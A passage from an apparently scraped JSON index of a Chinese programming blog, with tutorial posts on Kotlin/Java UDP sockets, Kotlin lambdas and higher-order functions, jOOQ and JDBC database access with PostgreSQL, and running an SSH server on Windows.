ByteArray(1024) 存储数据 val data2 = \u0026#34;Hello Client!\u0026#34;.toByteArray() 发送数据 val packet1 = DatagramPacket(data1, data1.size) 接收数据报包 val packet2 = DatagramPacket(data2, data2.size, null, 0) 发送数据报包（地址和端口未指定） DatagramSocket(4567).use { while (true) { it.receive(packet1) 阻塞方法 println(\u0026#34;Receive：${String(packet1.data, 0, packet1.length)}\u0026#34;) packet2.address = packet1.address packet2.port = packet1.port it.send(packet2) } } } ---- 输出： Receive：Hello Server! 客户端： ---- fun main(args: Array\u0026lt;String\u0026gt;) { val data1 = ByteArray(1024) 存储数据 val data2 = \u0026#34;Hello Server!\u0026#34;.toByteArray() 发送数据 val packet1 = DatagramPacket(data1, data1.size) 接收数据报包 val packet2 = DatagramPacket(data2, data2.size, InetAddress.getByName(\u0026#34;127.0.0.1\u0026#34;), 4567) 发送数据报包 DatagramSocket().use { it.send(packet2) it.receive(packet1) 阻塞方法 println(\u0026#34;Receive：${String(packet1.data, 0, packet1.length)}\u0026#34;) } } ---- 输出： Receive：Hello Client! ","permalink":"https://xhstormr.github.io/blog/posts/java-socket/","summary":"","title":"Java Socket"},{"content":"Updated on 2017-02-13\nKotlin fun main(args: Array\u0026lt;String\u0026gt;) { a({ s -\u0026gt; println(s) }) Lambda 表达式 等同于 a { s -\u0026gt; println(s) } 移至括号外并省略括号 等同于 a { println(it) } 使用 `it` 替代 等同于 a(::println) 使用函数引用 } 等同于 fun main(args: Array\u0026lt;String\u0026gt;) = a(::println) 函数体只含有 1 句表达式，省略函数体和返回值 ---- fun a(block: (String) -\u0026gt; Unit): Unit { 高阶函数（函数参数使用函数类型表达）（函数为一等公民） block(\u0026#34;ABC\u0026#34;) } 等同于 fun a(block: (String) -\u0026gt; Unit) { 省略 Unit (void) 返回值 block(\u0026#34;ABC\u0026#34;) } 等同于 fun a(block: (String) -\u0026gt; Unit) = block(\u0026#34;ABC\u0026#34;) 函数体只含有 1 句表达式，省略函数体和返回值 ------------------------------------------------------- Finally： fun main(args: Array\u0026lt;String\u0026gt;) = a(::println) fun a(block: (String) -\u0026gt; Unit) = block(\u0026#34;ABC\u0026#34;) ---- 输出： ABC Java public class Main { public static void main(String[] args) { a((String s) -\u0026gt; { Lambda 表达式 System.out.println(s); }); 等同于 a((String s) -\u0026gt; System.out.println(s)); 方法体只含有 1 条执行代码，转为表达式（省略方法体和返回值） 等同于 a(s -\u0026gt; System.out.println(s)); 省略参数类型 等同于 a(System.out::println); 使用方法引用 } private static void a(A a) { 假：高阶函数（函数参数使用接口表达）（只支持传递对象，不支持传递方法） a.a(\u0026#34;ABC\u0026#34;); } } @FunctionalInterface interface A { void a(String str); } ------------------------------------------------------- Finally： public class Main { public static void main(String[] args) { a(System.out::println); } private static void a(A a) { a.a(\u0026#34;ABC\u0026#34;); } } @FunctionalInterface interface A { void a(String str); } ---- 输出： ABC 对比 Kotlin： fun main(args: Array\u0026lt;String\u0026gt;) = a(::println) fun a(block: (String) -\u0026gt; Unit) = block(\u0026#34;ABC\u0026#34;) 函数类型表达（函数为一等公民） Java： public class Main { public static void main(String[] args) { a(System.out::println); } private static void a(A a) { 接口表达（只支持传递对象，不支持传递方法） a.a(\u0026#34;ABC\u0026#34;); } } @FunctionalInterface interface A { void a(String str); } ","permalink":"https://xhstormr.github.io/blog/posts/kotlin-and-java/","summary":"","title":"函数式编程：Kotlin 与 Java"},{"content":"Updated on 2017-02-01\nhttps://github.com/jOOQ/jOOQ\nhttps://www.jooq.org/javadoc/latest/allclasses-noframe.html\nhttps://jcenter.bintray.com/org/jooq/\nhttps://jcenter.bintray.com/org/postgresql/postgresql/\nMap java -Dorg.jooq.no-logo=true -cp jooq-3.9.1.jar;jooq-meta-3.9.1.jar;jooq-codegen-3.9.1.jar;postgresql-9.4.1212.jar;. org.jooq.util.GenerationTool 123.xml 123.xml ⇳ \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; standalone=\u0026#34;yes\u0026#34;?\u0026gt; \u0026lt;configuration xmlns=\u0026#34;http://www.jooq.org/xsd/jooq-codegen-3.9.0.xsd\u0026#34;\u0026gt; \u0026lt;jdbc\u0026gt; \u0026lt;driver\u0026gt;org.postgresql.Driver\u0026lt;/driver\u0026gt; \u0026lt;url\u0026gt;jdbc:postgresql://127.0.0.1:5432/postgres\u0026lt;/url\u0026gt; \u0026lt;user\u0026gt;123\u0026lt;/user\u0026gt; \u0026lt;password\u0026gt;123456\u0026lt;/password\u0026gt; \u0026lt;/jdbc\u0026gt; \u0026lt;generator\u0026gt; \u0026lt;name\u0026gt;org.jooq.util.JavaGenerator\u0026lt;/name\u0026gt; \u0026lt;database\u0026gt; \u0026lt;name\u0026gt;org.jooq.util.postgres.PostgresDatabase\u0026lt;/name\u0026gt; \u0026lt;inputSchema\u0026gt;public\u0026lt;/inputSchema\u0026gt; \u0026lt;includes\u0026gt;.*\u0026lt;/includes\u0026gt; \u0026lt;excludes\u0026gt;\u0026lt;/excludes\u0026gt; \u0026lt;/database\u0026gt; \u0026lt;target\u0026gt; \u0026lt;packageName\u0026gt;sql.generated\u0026lt;/packageName\u0026gt; \u0026lt;directory\u0026gt;D:\\123\u0026lt;/directory\u0026gt; \u0026lt;/target\u0026gt; \u0026lt;/generator\u0026gt; \u0026lt;/configuration\u0026gt; Query import org.jooq.impl.DSL import sql.generated.tables.Weather fun main(args: Array\u0026lt;String\u0026gt;) { System.setProperty(\u0026#34;org.jooq.no-logo\u0026#34;, \u0026#34;true\u0026#34;) val dslContext = DSL.using(\u0026#34;jdbc:postgresql://127.0.0.1:5432/postgres\u0026#34;, \u0026#34;123\u0026#34;, \u0026#34;123456\u0026#34;) val result = dslContext.select().from(Weather.WEATHER).fetch() result.forEach { val str = it[Weather.WEATHER.CITY] val i1 = it[Weather.WEATHER.TEMP_LO] val i2 = it[Weather.WEATHER.TEMP_HI] val date = it[Weather.WEATHER.DATE] val float = it[Weather.WEATHER.PRCP] println(\u0026#34;|$str |$i1 |$i2 |$date |$float\u0026#34;) } println(\u0026#34;共 ${result.size} 条记录\u0026#34;) dslContext.close() } ------------------------------------------------------- 原生 SQL 语句 ---- val result = dslContext.resultQuery(\u0026#34;select * from weather\u0026#34;).fetch() val result = dslContext.resultQuery(\u0026#34;select {0},{1},{2},{3},{4} from {5}\u0026#34;, DSL.name(\u0026#34;city\u0026#34;), DSL.name(\u0026#34;temp_lo\u0026#34;), DSL.name(\u0026#34;temp_hi\u0026#34;), DSL.name(\u0026#34;date\u0026#34;), DSL.name(\u0026#34;prcp\u0026#34;), DSL.name(\u0026#34;weather\u0026#34;)).fetch() 防止 SQL Injection ---- DSL.name(\u0026#34;abc\u0026#34;) \u0026#34;abc\u0026#34; DSL.inline(\u0026#34;abc\u0026#34;) \u0026#39;abc\u0026#39; import org.jooq.impl.DSL import sql.generated.tables.Weather import sql.generated.tables.records.WeatherRecord fun main(args: Array\u0026lt;String\u0026gt;) { System.setProperty(\u0026#34;org.jooq.no-logo\u0026#34;, \u0026#34;true\u0026#34;) val dslContext = DSL.using(\u0026#34;jdbc:postgresql://127.0.0.1:5432/postgres\u0026#34;, \u0026#34;123\u0026#34;, \u0026#34;123456\u0026#34;) val result = dslContext.select().from(Weather.WEATHER).fetch { RecordMapper（ORM） val str = it[Weather.WEATHER.CITY] val i1 = it[Weather.WEATHER.TEMP_LO] val i2 = it[Weather.WEATHER.TEMP_HI] val date = it[Weather.WEATHER.DATE] val float = it[Weather.WEATHER.PRCP] WeatherRecord(str, i1, i2, float, date) } result.forEach { println(\u0026#34;|${it.city} |${it.tempLo} |${it.tempHi} |${it.date} |${it.prcp}\u0026#34;) } println(\u0026#34;共 ${result.size} 条记录\u0026#34;) dslContext.close() } build.gradle ⇳ compile \u0026#39;org.jetbrains.kotlin:kotlin-stdlib:+\u0026#39; compile \u0026#39;org.jooq:jooq:+\u0026#39; compile \u0026#39;org.postgresql:postgresql:42.0.0\u0026#39; Insert import org.jooq.impl.DSL import sql.generated.tables.Weather.WEATHER import java.sql.Date fun main(args: Array\u0026lt;String\u0026gt;) { System.setProperty(\u0026#34;org.jooq.no-logo\u0026#34;, \u0026#34;true\u0026#34;) val dslContext = DSL.using(\u0026#34;jdbc:postgresql://127.0.0.1:5432/postgres\u0026#34;, \u0026#34;123\u0026#34;, \u0026#34;123456\u0026#34;) dslContext.insertInto(WEATHER, WEATHER.CITY, WEATHER.TEMP_LO, WEATHER.TEMP_HI, WEATHER.DATE, WEATHER.PRCP) .values(\u0026#34;Chongqing\u0026#34;, 25, 29, Date.valueOf(\u0026#34;2017-01-27\u0026#34;), 0.25f) .values(\u0026#34;Chongqing\u0026#34;, 25, 29, Date.valueOf(\u0026#34;2017-01-28\u0026#34;), 0.25f) .values(\u0026#34;Chongqing\u0026#34;, 25, 29, Date.valueOf(\u0026#34;2017-01-29\u0026#34;), 0.25f) .execute() 插入 3 条数据 } JDBC Property val properties = Properties().apply { this.load(File(\u0026#34;db.properties\u0026#34;).inputStream()) } println(properties[\u0026#34;jdbc.url\u0026#34;]) println(properties[\u0026#34;jdbc.username\u0026#34;]) println(properties[\u0026#34;jdbc.password\u0026#34;]) ---- 输出： jdbc:postgresql://127.0.0.1:5432/postgres 123 123456 db.properties ⇳ jdbc.url=jdbc:postgresql://127.0.0.1:5432/postgres jdbc.username=123 jdbc.password=123456 Native Method Statement 接口 Statement 主要用于执行一次性静态 SQL 语句，效率不高，也不能防止 SQL Injection。 import java.sql.DriverManager fun main(args: Array\u0026lt;String\u0026gt;) { Class.forName(\u0026#34;org.postgresql.Driver\u0026#34;) val connection = DriverManager.getConnection(\u0026#34;jdbc:postgresql://127.0.0.1:5432/postgres\u0026#34;, \u0026#34;123\u0026#34;, \u0026#34;123456\u0026#34;) val statement = connection.createStatement() val sql1 = \u0026#34;INSERT INTO weather VALUES (\u0026#39;San Francisco\u0026#39;, 46, 50, 0.25, \u0026#39;1994-11-27\u0026#39;)\u0026#34; val sql2 = \u0026#34;SELECT * FROM weather\u0026#34; val i = statement.executeUpdate(sql1) 执行 DML 语句，返回影响的记录数 val resultSet = statement.executeQuery(sql2) 执行 DQL 语句，返回查询的结果集 var c = 0 while (resultSet.next()) { c++ val str = resultSet.getString(\u0026#34;city\u0026#34;) val i1 = resultSet.getInt(\u0026#34;temp_lo\u0026#34;) val i2 = resultSet.getInt(\u0026#34;temp_hi\u0026#34;) val date = resultSet.getDate(\u0026#34;date\u0026#34;) val float = resultSet.getFloat(\u0026#34;prcp\u0026#34;) println(\u0026#34;|$str |$i1 |$i2 |$date |$float\u0026#34;) } println(\u0026#34;共 $c 条记录\u0026#34;) connection.close() } PreparedStatement 接口 继承自 Statement 接口。 PreparedStatement 重用 SQL 语句并防止 SQL Injection（转义特殊字符）。 import java.sql.Date import java.sql.DriverManager fun main(args: Array\u0026lt;String\u0026gt;) { val sql1 = \u0026#34;INSERT INTO weather VALUES (?, ?, ?, ?, ?);\u0026#34; 设置占位符 val sql2 = \u0026#34;SELECT * FROM weather WHERE city = ?\u0026#34; val connection = DriverManager.getConnection(\u0026#34;jdbc:postgresql://127.0.0.1:5432/postgres\u0026#34;, \u0026#34;123\u0026#34;, \u0026#34;123456\u0026#34;) val preparedStatement1 = connection.prepareStatement(sql1) val preparedStatement2 = connection.prepareStatement(sql2) preparedStatement1.setString(1, \u0026#34;San Francisco\u0026#34;) 填充占位符 preparedStatement1.setInt(2, 46) preparedStatement1.setInt(3, 50) preparedStatement1.setFloat(4, 0.25f) preparedStatement1.setDate(5, Date.valueOf(\u0026#34;1994-11-27\u0026#34;)) val i = preparedStatement1.executeUpdate() 返回影响的记录数 preparedStatement2.setString(1, \u0026#34;San Francisco\u0026#34;) 填充占位符 val resultSet = preparedStatement2.executeQuery() 返回查询的结果集 var c = 0 while (resultSet.next()) { c++ val str = resultSet.getString(\u0026#34;city\u0026#34;) val i1 = resultSet.getInt(\u0026#34;temp_lo\u0026#34;) val i2 = resultSet.getInt(\u0026#34;temp_hi\u0026#34;) val date = resultSet.getDate(\u0026#34;date\u0026#34;) val float = resultSet.getFloat(\u0026#34;prcp\u0026#34;) println(\u0026#34;|$str |$i1 |$i2 |$date |$float\u0026#34;) } println(\u0026#34;共 $c 条记录\u0026#34;) connection.close() } ResultSet 接口 import java.sql.DriverManager import java.sql.ResultSet fun main(args: Array\u0026lt;String\u0026gt;) { val connection = DriverManager.getConnection(\u0026#34;jdbc:postgresql://127.0.0.1:5432/postgres\u0026#34;, \u0026#34;123\u0026#34;, \u0026#34;123456\u0026#34;) val statement = connection.createStatement(ResultSet.TYPE_SCROLL_SENSITIVE, ResultSet.CONCUR_UPDATABLE) 指定结果集可滚动并感知数据变化，可更新 val resultSet = statement.executeQuery(\u0026#34;SELECT * FROM weather;\u0026#34;) val resultSetMetaData = resultSet.metaData 结果集元数据 for (i in 1..resultSetMetaData.columnCount) { val s1 = resultSetMetaData.getColumnName(i) 在 Table 中的列名 val s2 = resultSetMetaData.getColumnTypeName(i) 在 Database 中的类型 val s3 = resultSetMetaData.getColumnClassName(i) 在 Java 中的类型 println(\u0026#34;|$s1 |$s2 |$s3\u0026#34;) } var c = 0 while (resultSet.next()) { 遍历结果集 c++ val str = resultSet.getString(\u0026#34;city\u0026#34;) val i1 = resultSet.getInt(\u0026#34;temp_lo\u0026#34;) val i2 = resultSet.getInt(\u0026#34;temp_hi\u0026#34;) val date = resultSet.getDate(\u0026#34;date\u0026#34;) val float = resultSet.getFloat(\u0026#34;prcp\u0026#34;) println(\u0026#34;|$str |$i1 |$i2 |$date |$float\u0026#34;) } println(\u0026#34;共 $c 条记录\u0026#34;) connection.close() } Tips： Statement stmt = conn.createStatement(type, concurrency); PreparedStatement stmt = conn.prepareStatement(sql, type, concurrency); Transaction fun main(args: Array\u0026lt;String\u0026gt;) { val connection = DriverManager.getConnection(\u0026#34;jdbc:postgresql://127.0.0.1:5432/postgres\u0026#34;, \u0026#34;123\u0026#34;, \u0026#34;123456\u0026#34;) val statement = connection.createStatement() try { val b = connection.autoCommit 保存自动提交状态 connection.autoCommit = false 关闭自动提交 statement.executeUpdate(\u0026#34;UPDATE weather SET temp_hi = temp_hi - 2, temp_lo = temp_lo - 2 WHERE date \u0026gt; \u0026#39;1994-11-28\u0026#39;;\u0026#34;) statement.executeUpdate(\u0026#34;UPDATE weather SET prcp = 0.0 WHERE city = \u0026#39;Hayward\u0026#39;\u0026#34;) connection.commit() 统一提交事务，失败则回滚 connection.autoCommit = b 恢复至原有提交状态 } catch (e: SQLException) { connection.rollback() 失败时回滚事务 } connection.close() 释放资源 } Batch Statement： fun main(args: Array\u0026lt;String\u0026gt;) { val connection = DriverManager.getConnection(\u0026#34;jdbc:postgresql://127.0.0.1:5432/postgres\u0026#34;, \u0026#34;123\u0026#34;, \u0026#34;123456\u0026#34;) val statement = connection.createStatement() val sql = \u0026#34;INSERT INTO weather VALUES (\u0026#39;San Francisco\u0026#39;, 46, 50, 0.25, \u0026#39;1994-11-27\u0026#39;);\u0026#34; for (i in 0..1004) { 共 1005 条数据 statement.addBatch(sql) 添加至批处理 if (i % 500 == 0) { 防止因存储过多待处理 SQL 语句，而导致 Out Of Memory statement.executeBatch() 统一提交 SQL 语句，降低网络通信次数 statement.clearBatch() 清空批处理 } } statement.executeBatch() 提交剩余 SQL 语句 statement.clearBatch() connection.close() } ---- PreparedStatement： fun main(args: Array\u0026lt;String\u0026gt;) { val connection = DriverManager.getConnection(\u0026#34;jdbc:postgresql://127.0.0.1:5432/postgres\u0026#34;, \u0026#34;123\u0026#34;, \u0026#34;123456\u0026#34;) val prepareStatement = connection.prepareStatement(\u0026#34;INSERT INTO employee (id) VALUES (?);\u0026#34;) for (i in 0..1004) { prepareStatement.setInt(1, i) prepareStatement.addBatch() if (i % 500 == 0) { prepareStatement.executeBatch() prepareStatement.clearBatch() } } prepareStatement.executeBatch() prepareStatement.clearBatch() connection.close() } Paging 每次只请求 1 页数据量，对内存压力较小，适合大数据量的表： fun main(args: Array\u0026lt;String\u0026gt;) { val connection = DriverManager.getConnection(\u0026#34;jdbc:postgresql://127.0.0.1:5432/postgres\u0026#34;, \u0026#34;123\u0026#34;, \u0026#34;123456\u0026#34;) val prepareStatement = connection.prepareStatement(\u0026#34;SELECT * FROM employee LIMIT 10 OFFSET ?;\u0026#34;) 只取 10 条数据，偏移量每次递增 10 fun a(i: Int) = i * 10 偏移量每次递增 10 for (i in 0..4) { prepareStatement.setInt(1, a(i)) val resultSet = prepareStatement.executeQuery() while (resultSet.next()) { val int = resultSet.getInt(\u0026#34;id\u0026#34;) val str = resultSet.getString(\u0026#34;name\u0026#34;) println(\u0026#34;|$int |$str\u0026#34;) } println(\u0026#34;———————\u0026#34;) } connection.close() } ---- 一次性取出所有数据，对内存压力较大，适合小数据量的表： fun main(args: Array\u0026lt;String\u0026gt;) { val connection = DriverManager.getConnection(\u0026#34;jdbc:postgresql://127.0.0.1:5432/postgres\u0026#34;, \u0026#34;123\u0026#34;, \u0026#34;123456\u0026#34;) val statement = connection.createStatement(ResultSet.TYPE_SCROLL_SENSITIVE, ResultSet.CONCUR_UPDATABLE) 可滚动结果集 val resultSet = statement.executeQuery(\u0026#34;SELECT * FROM employee;\u0026#34;) 包含 1005 条记录 a(2, resultSet) 第 2 页（10 - 19） a(1, resultSet) 第 1 页（00 - 09） a(5, resultSet) 第 5 页（40 - 49） connection.close() } fun a(p: Int, resultSet: ResultSet) { val x = (p - 1) * 10 val y = p * 10 var j = 0 resultSet.beforeFirst() while (resultSet.next()) { if (x \u0026lt;= j \u0026amp;\u0026amp; j \u0026lt; y) { val int = resultSet.getInt(\u0026#34;id\u0026#34;) val str = resultSet.getString(\u0026#34;name\u0026#34;) println(\u0026#34;|$int |$str\u0026#34;) } else if (j \u0026gt;= y) { break } j++ } } ","permalink":"https://xhstormr.github.io/blog/posts/jooq/","summary":"","title":"jOOQ"},{"content":"Updated on 2017-01-14\nhttps://man.openbsd.org/sshd_config\nhttps://www.openssh.com/manual.html\nhttps://github.com/git-for-windows/git/releases/latest\nhttps://winscp.net/eng/download.php\nhttps://the.earth.li/~sgtatham/putty/latest/w64/psftp.exe\nhttps://the.earth.li/~sgtatham/putty/latest/w64/putty.exe\n配置 D:\\Work\\BLOG\\GIT\u0026gt; type nul \u0026gt; etc\\passwd echo sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin \u0026gt; etc\\passwd md var\\empty\\sshd usr\\bin\\ssh-keygen -A 可选： type nul \u0026gt; etc\\motd echo 登录信息： \u0026gt; etc\\motd echo 你好！ \u0026gt;\u0026gt; etc\\motd type nul \u0026gt; etc\\ssh\\sshd_config echo PrintMotd yes \u0026gt; etc\\ssh\\sshd_config echo PermitRootLogin no \u0026gt;\u0026gt; etc\\ssh\\sshd_config echo Subsystem sftp internal-sftp \u0026gt;\u0026gt; etc\\ssh\\sshd_config 设置公钥登录 ---- usr\\bin\\ssh-keygen copy /y \u0026#34;C:\\Users\\XhstormR\\.ssh\\id_rsa.pub\u0026#34; \u0026#34;C:\\Users\\XhstormR\\.ssh\\authorized_keys\u0026#34; echo AuthorizedKeysFile .ssh/authorized_keys \u0026gt;\u0026gt; etc\\ssh\\sshd_config 禁止密码登录 ---- echo PasswordAuthentication no \u0026gt;\u0026gt; etc\\ssh\\sshd_config PS： md .12 创建 \u0026#39;.\u0026#39; 前缀文件夹 type nul \u0026gt; .123 创建 \u0026#39;.\u0026#39; 前缀文件 启动 D:\\Work\\BLOG\\GIT\\usr\\bin\\sshd 停止 netstat -ano | findstr \u0026#34;0.0.0.0:22\u0026#34; tasklist | findstr \u0026#34;16940\u0026#34; taskkill /f /t /im sshd.exe 简化： netstat -ano | findstr \u0026#34;0.0.0.0:22\u0026#34; taskkill /f /t /pid 16940 简化： taskkill /f /t /im sshd.exe ","permalink":"https://xhstormr.github.io/blog/posts/ssh-server/","summary":"","title":"Windows SSH Server"},{"content":"Updated on 2017-04-13\nhttps://kotlin.link/\nhttps://kotlinlang.org/\nhttps://devdocs.io/kotlin-reference/\nhttps://kotlinlang.org/docs/reference/idioms.html\nhttps://kotlinlang.org/docs/reference/basic-syntax.html\nhttps://kotlinlang.org/api/latest/jvm/stdlib/index.html\nhttps://try.kotlinlang.org/\nhttps://kotlinlang.org/docs/kotlin-docs.pdf\nhttps://github.com/JetBrains/kotlin/releases/latest\nhttps://jcenter.bintray.com/org/jetbrains/kotlin/kotlin-stdlib/\nhttps://storage.googleapis.com/developers-playground/kp-wrapper-devsite.html\nCode // ABC /* DEF GHI */ ------------------------------------------------------- fun main(args: Array\u0026lt;String\u0026gt;) { main 函数（程序入口） println(\u0026#34;Hello World!\u0026#34;) } ------------------------------------------------------- val a: String 先声明后赋值（只适用于变量，没有赋值时，必须显式声明类型；作为属性时，必须在声明的同时进行赋值） a = \u0026#34;ABC\u0026#34; ---- val a: String = \u0026#34;ABC\u0026#34; 声明对象的同时进行实例化（显式声明类型） ---- val a = \u0026#34;ABC\u0026#34; 声明对象的同时进行实例化（自动推导类型） ------------------------------------------------------- Kotlin 中没有（Primitive）基本数据类型，一切皆为（Reference）引用数据类型。 var a = 123 变量（引用可变 get/set） val b = 123 常量（引用只读 get） ------------------------------------------------------- val a = \u0026#34;\u0026#34;\u0026#34; 原始字符串 fun helloWorld(val name : String) { println(\u0026#34;Hello, world!\u0026#34;) } \u0026#34;\u0026#34;\u0026#34; ---- val a = \u0026#34;ABC\u0026#34; val b = \u0026#34;$a 的长度为${a.length}\u0026#34; 字符串模板 ------------------------------------------------------- Kotlin 中尽量将变量声明为不可空，不可变。 var a: String = null 编译器报错：不可空变量 var b: String? = null 通过 `?` 明确标识变量可为 null（可空变量） println(b.length) 编译器报错：不能直接访问可空变量 println(b?.length) 通过 `?.` 访问可空变量，若为 null，则停止继续调用 println(b!!.length) 通过 `!!.` 访问可空变量，若为 null，则抛出 KotlinNullPointerException 异常 try { try-catch println(b!!.length) } catch (e: KotlinNullPointerException) { println(\u0026#34;发生空指针异常!\u0026#34;) } ---- val a: String? = null val b: Int = if (a != null) { 空检查 a.length 不需要通过 `?.` 访问可空变量（Smart Cast） } else { -1 } 可简化为 val c: Int = if (a != null) a.length else -1 可用于替代 Java 中的三元运算符 可简化为 val d: Int = a?.length ?: -1 `?:` 操作符：若左边表达式的返回值为 null 则执行右边表达式 ------------------------------------------------------- fun sum(x: Int = 1, y: Int = 1): Unit { 函数（设置参数默认值，以减少重载） println(\u0026#34;$x+$y=${x + y}\u0026#34;) 字符串模板 } 可简化为 fun sum(x: Int = 1, y: Int = 1) { 若返回值为 Unit (void)，则可省略返回值 println(\u0026#34;$x+$y=${x + y}\u0026#34;) } 可简化为 fun sum(x: Int = 1, y: Int = 1) = println(\u0026#34;$x+$y=${x + y}\u0026#34;) 若函数体只含有 1 句表达式，则可省略函数体和返回值（自动推导类型） sum() sum(3) sum(y = 3) 命名参数 ---- 输出： 1+1=2 3+1=4 1+3=4 ------------------------------------------------------- fun hello(name: String): String { return \u0026#34;Hello,$name\u0026#34; } 可简化为 fun hello(name: String) = \u0026#34;Hello,$name\u0026#34; 若函数体只含有 1 句表达式，可省略函数体和返回值（自动推导类型） ------------------------------------------------------- fun show(vararg str: String): Unit { vararg：可变长参数，参数数量 [0,∞)，视为数组 Array\u0026lt;out T\u0026gt; for (s in str) { str 为 Array\u0026lt;out String\u0026gt; print(s + \u0026#34; \u0026#34;) } } show() ---- 输出： 无 val array: Array\u0026lt;String\u0026gt; = arrayOf(\u0026#34;B\u0026#34;, \u0026#34;C\u0026#34;) show(\u0026#34;A\u0026#34;, *array, \u0026#34;D\u0026#34;) （spread）展开操作符：在数组前加上 `*` ---- 输出： A B C D fun a(x: Int): Boolean { return x % 2 == 0 } 可简化为 fun a(x: Int) = x % 2 == 0 函数类型：(Int) -\u0026gt; Boolean（需要 Int，返回 Boolean） @kotlin.internal.InlineOnly public inline fun println(message: Int) { 函数类型：(Int) -\u0026gt; Unit（需要 Int，返回 Unit）（类库自带函数） System.out.println(message) } val array = arrayOf(1, 2, 3, 4) array 使用 Lambda 表达式 .filter { it % 2 == 0 } .forEach { System.out.println(it) } 等同于 array 使用函数引用 .filter(::a) .forEach(::println) 等同于 val aa: (Int) -\u0026gt; Boolean = ::a 将函数引用存储在变量中，类型（声明）为 \u0026#34;函数类型\u0026#34; val bb: (Int) -\u0026gt; Unit = ::println array .filter(aa) .forEach(bb) ---- 输出： 2 4 ------------------------------------------------------- 高阶函数：一种将函数作为参数或者返回值的函数。 ↳ 函数参数： ↳ Lambda 表达式：跟 Java8 中的概念相同，只能作为高阶函数的参数或返回值。 ↳ 匿名函数：没名字的函数，只能作为高阶函数的参数或返回值。 ↳ 命名函数：可以通过函数引用作为高阶函数的参数。 ↳ 函数引用：通过在函数名称前加上 `::` 操作符，把命名函数作为参数传入。 val array: Array\u0026lt;Char\u0026gt; = arrayOf(\u0026#39;A\u0026#39;, \u0026#39;B\u0026#39;, \u0026#39;C\u0026#39;, \u0026#39;D\u0026#39;) val list: MutableList\u0026lt;Int\u0026gt; = array.mapTo(mutableListOf(), { c -\u0026gt; c.toInt() }) mapTo 为高阶函数，{} 为 Lambda 表达式 可简化为 val list: MutableList\u0026lt;Int\u0026gt; = array.mapTo(mutableListOf()) { c -\u0026gt; c.toInt() } 高阶函数中若最后一个参数是函数参数，可移至括号外；若只需要一个函数参数，可省略括号 可简化为 val list: MutableList\u0026lt;Int\u0026gt; = array.mapTo(mutableListOf()) { it.toInt() } Lambda 表达式中若只接收一个参数，可用 `it` 替代 可简化为 val list: MutableList\u0026lt;Int\u0026gt; = array.mapTo(mutableListOf(), Char::toInt) Lambda 表达式转为函数引用 println(list) ---- 输出： [65, 66, 67, 68] ------------------------------------------------------- (1..5).reduce { _, _ -\u0026gt; 0 } 0（若不需要 Lambda 表达式中提供的参数，可用 `_` 占位） ------------------------------------------------------- fun a(i: Int): Int { return i * 2 } 可简化为 fun a(i: Int) = i * 2 命名函数（有名字的函数） val list = listOf(1, 2, 3, 4, 5) list.map(fun(i: Int): Int { return i * 2 }) 可简化为 list.map(fun(i: Int) = i * 2) 匿名函数（没名字的函数） ---- list.map(::a) 对命名函数使用函数引用 ---- list.map { it * 2 } Lambda 表达式 ------------------------------------------------------- val list = listOf(1, 2, 3, 4, 5) list.map({ i -\u0026gt; i * 2 }) 此高阶函数只需要一个函数参数 可简化为 list.map() { i -\u0026gt; i * 2 } 移至括号外 可简化为 list.map { i -\u0026gt; i * 2 } 省略括号 可简化为 list.map { it * 2 } 使用 `it` 替代 ------------------------------------------------------- 无标签限制的 this 指向包含当前代码的最内层。 val stringBuilder = StringBuilder(\u0026#34;123\u0026#34;).apply a@ { 在 Lambda 表达式处显式声明标签，以区分重名标签和 this 对象 println(this@a) \u0026#34;456\u0026#34;.apply { println(this@apply) this@a.append(this@apply) } } println(stringBuilder) ---- 输出： 123 456 123456 ------------------------------------------------------- 有标签限制的 break 跳转至该标签指定的循环，继续后面的表达式。 有标签限制的 continue 跳转至该标签指定的循环，继续下一次迭代。 a@ for (x in 0..9) { b@ for (y in 10..19) { if (x == 5 \u0026amp;\u0026amp; y == 15) { break@a 跳转至最外层循环并结束，最后输出：5 14 } println(\u0026#34;$x $y\u0026#34;) } } ------------------------------------------------------- 无标签限制的 return 返回结果至最直接包含它的函数； 带标签限制的 return 一般应用于高阶函数中的 Lambda 表达式。 Lambda 表达式会形成一个闭包（捕捉使用到的外部变量，形成一个作用域），可以通过 Inline，消除这种开销。 对象是带方法的数据； 闭包是带数据的方法。（Closure） inline 签名一般与高阶函数搭配使用，以优化 Lambda 表达式，直接将代码写至调用处，来减少函数调用栈的层数，但 会增加代码生成量。 Kotlin 类库中的大部分高阶扩展函数都带有 inline 签名，使其成为内联高阶扩展函数，导致 Lambda 表达式不会引入 新作用域，函数体中的变量和外部环境中的变量具有相同的语义。 fun main(args: Array\u0026lt;String\u0026gt;) { a() println(\u0026#34;————————————\u0026#34;) b() println(\u0026#34;————————————\u0026#34;) c() } fun a() { val list1 = listOf(1, 2, 3, 4) println(list1) val list2 = list1.filter { Lambda 表达式：无标签限制，返回结果至 fun a()（最直接包含此 Lambda 表达式的函数） print(\u0026#34;+ \u0026#34;) it % 2 == 0 return } println() println(list2) } fun b() { val list1 = listOf(1, 2, 3, 4) println(list1) val list2 = list1.filter { Lambda 表达式：有标签限制，返回结果至 filter print(\u0026#34;+ \u0026#34;) return@filter it % 2 == 0 隐式标签（与接收该 Lambda 表达式的高阶函数同名） } println() println(list2) } fun c() { val list1 = listOf(1, 2, 3, 4) println(list1) val list2 = list1.filter(fun(i: Int): Boolean { 匿名函数：返回结果至 filter print(\u0026#34;+ \u0026#34;) return i % 2 == 0 }) println() println(list2) } ---- 输出： [1, 2, 3, 4] + ———————————— [1, 2, 3, 4] + + + + [2, 4] ———————————— [1, 2, 3, 4] + + + + [2, 4] ------------------------------------------------------- fun main(args: Array\u0026lt;String\u0026gt;) { print(1) a { 未内联高阶函数：return 有 1 个选项，返回结果至 a print(2) return@a 隐式标签（与接收该 Lambda 表达式的高阶函数同名） } print(3) ---- 输出： 123 print(1) b { 已内联高阶函数：return 有 2 个选项，返回结果至 b（带标签） 或 main（不带标签）（最直接包含此 Lambda 表达式的函数） print(2) return } print(3) ---- 输出： 12 print(1) b { 已内联高阶函数 print(2) return@b 隐式标签（与接收该 Lambda 表达式的高阶函数同名） } print(3) ---- 输出： 123 } fun a(block: () -\u0026gt; Unit) { 未内联高阶函数 block() } inline fun b(block: () -\u0026gt; Unit) { 已内联高阶函数 block() } ------------------------------------------------------- 注意 inline 修饰函数，crossinline、noinline 修饰函数参数 inline fun a1(block: () -\u0026gt; Unit) { block() 作为函数调用 } 